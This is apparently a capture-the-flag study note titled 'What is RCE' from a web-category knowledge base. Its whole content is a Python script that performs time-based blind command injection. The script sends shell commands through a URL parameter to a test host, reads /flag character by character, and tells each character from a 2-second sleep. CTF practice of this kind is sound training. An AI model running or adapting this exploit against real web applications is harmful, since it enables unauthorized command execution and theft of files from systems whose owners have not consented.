# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/命令执行.md
# TITLE: 什么是rce
# CATEGORY: web

import requests
import string
import time

url='http://localhost.test.php/?c='
dic=string.printable[:-6]
flag=''

for i in range(1,50):
    judge=0
    for j in dic:
        now=f'{url}a=$(cat /flag | head -1 | cut -b {i});if [ $a = {j} ];then sleep 2;fi'
        start=time.time()
        r=requests.get(now)
        end=time.time()
        if int(end)-int(start) >1:
            judge=1
            flag+=j
            print(flag)
            break
    if judge==0:
        break

print(flag)
